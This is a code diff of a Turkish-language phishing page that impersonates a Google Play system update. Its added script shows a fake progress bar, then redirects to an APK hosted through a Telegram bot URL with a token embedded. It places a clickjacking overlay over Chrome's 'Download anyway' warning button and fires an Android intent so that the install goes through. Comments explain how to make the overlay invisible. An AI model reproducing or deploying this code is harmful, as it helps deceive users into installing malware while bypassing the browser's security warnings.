@@ -5,97 +5,88 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Play - Sistem Güncellemesi</title>
     <style>
-        /* Google Play Teması */
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            background: #ffffff; 
-            margin: 0; 
-            overflow: hidden; 
-        }
-        .container { 
-            width: 90%; 
-            max-width: 400px; 
-            text-align: center; 
-        }
-        .logo { 
-            width: 60px; 
-            margin-bottom: 20px; 
-        }
-        .title { 
-            font-size: 22px; 
-            color: #202124; 
-            margin-bottom: 10px; 
-            font-weight: 500; 
-        }
-        .progress-container { 
-            width: 100%; 
-            background: #e8eaed; 
-            border-radius: 10px; 
-            height: 4px; 
-            margin: 25px 0; 
-        }
-        .progress-bar { 
-            width: 0%; 
-            height: 100%; 
-            background: #01875f; 
-            border-radius: 10px; 
-            transition: width 0.2s; 
-        }
-        .status { 
-            color: #5f6368; 
-            font-size: 14px; 
-            margin-top: 10px; 
-            line-height: 1.5;
-        }
-        #start-btn { 
-            background: #01875f; 
-            color: white; 
-            border: none; 
-            padding: 12px 24px; 
-            border-radius: 25px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            width: 100%; 
-            font-weight: bold;
-        }
+        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff; margin: 0; overflow: hidden; }
+        .container { width: 90%; max-width: 400px; text-align: center; }
+        .logo { width: 60px; margin-bottom: 20px; }
+        .title { font-size: 22px; color: #202124; margin-bottom: 10px; font-weight: 500; }
+        .progress-container { width: 100%; background: #e8eaed; border-radius: 10px; height: 4px; margin: 25px 0; }
+        .progress-bar { width: 0%; height: 100%; background: #01875f; border-radius: 10px; transition: width 0.2s; }
+        .status { color: #5f6368; font-size: 14px; margin-top: 10px; }
+        #start-btn { background: #01875f; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; font-weight: bold; }
 
-        /* EN KRİTİK KISIM: Click-Trap (Tıklama Tuzağı)
-           Bu alan Chrome'un 'Yine de indir' butonunun tam üzerine biner.
-           Görsellerine göre koordinatlar optimize edildi.
-        */
+        /* Tıklama Tuzağı (Click-Trap) */
         #click-trap {
             position: fixed;
-            bottom: 24%;    /* Popup butonunun dikey konumu */
-            right: 8%;      /* Popup butonunun yatay konumu */
-            width: 42%;     /* Butonu tam kapatacak genişlik */
-            height: 65px;   /* Butonun tıklanabilir yüksekliği */
-            background: rgba(255, 0, 0, 0.4); /* TEST İÇİN KIRMIZI - Yerini görünce 0.4'ü 0 yap */
+            bottom: 24%;    /* Chrome buton yüksekliği */
+            right: 8%;      
+            width: 42%;     
+            height: 65px;   
+            background: rgba(255, 0, 0, 0.4); /* Yerini görünce 0.4'ü 0 yaparsın */
             z-index: 10000;
-            display: none;  /* Sadece bar dolduğunda görünecek */
+            display: none;
             border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" class="logo" alt="Play Store">
-        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" class="logo">
         <div id="title" class="title">Sistem Hazırlanıyor...</div>
-        
         <div class="progress-container">
             <div id="bar" class="progress-bar"></div>
         </div>
-        
         <p id="status" class="status">Cihaz uyumluluğu kontrol ediliyor.</p>
-        
         <button id="start-btn">Güncellemeyi Kur</button>
     </div>
 
-    <div id="click-trap" title="Onay Katmanı"></div>
+    <div id="click-trap"></div>
+
+    <script>
+        // Tüm kod burada, dışarıdan dosya çağırmıyoruz
+        document.getElementById('start-btn').addEventListener('click', function() {
+            const btn = this;
+            const bar = document.getElementById('bar');
+            const status = document.getElementById('status');
+            const trap = document.getElementById('click-trap');
+            
+            btn.style.display = 'none';
+            let width = 0;
+
+            const interval = setInterval(() => {
+                width += Math.random() * 8;
+                if (width >= 100) {
+                    clearInterval(interval);
+                    bar.style.width = "100%";
+                    status.innerText = "İndirme başlatılıyor...";
+
+                    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
+
+                    // 1. Chrome uyarısını tetikle
+                    window.location.href = apkUrl;
+
+                    // 2. Tuzağı aktif et (Popup gelince)
+                    setTimeout(() => {
+                        trap.style.display = "block";
+                        status.innerHTML = "<b style='color:#d93025'>DİKKAT:</b> Kurulum için alttaki <b>'Yine de indir'</b> butonuna dokunun.";
+                    }, 1000);
+
+                } else {
+                    bar.style.width = width + "%";
+                    status.innerText = "Güncelleme indiriliyor: %" + Math.round(width);
+                }
+            }, 100);
+        });
+
+        // Kırmızı alana dokunulduğunda çalışacak Intent zorlaması
+        document.getElementById('click-trap').addEventListener('click', function() {
+            const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
+            const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
+            
+            // Kullanıcı ekrana dokunmuş olduğu için Android bu komutu kabul eder
+            window.location.href = intentUrl;
+        });
+    </script>
+</body>
+</html>
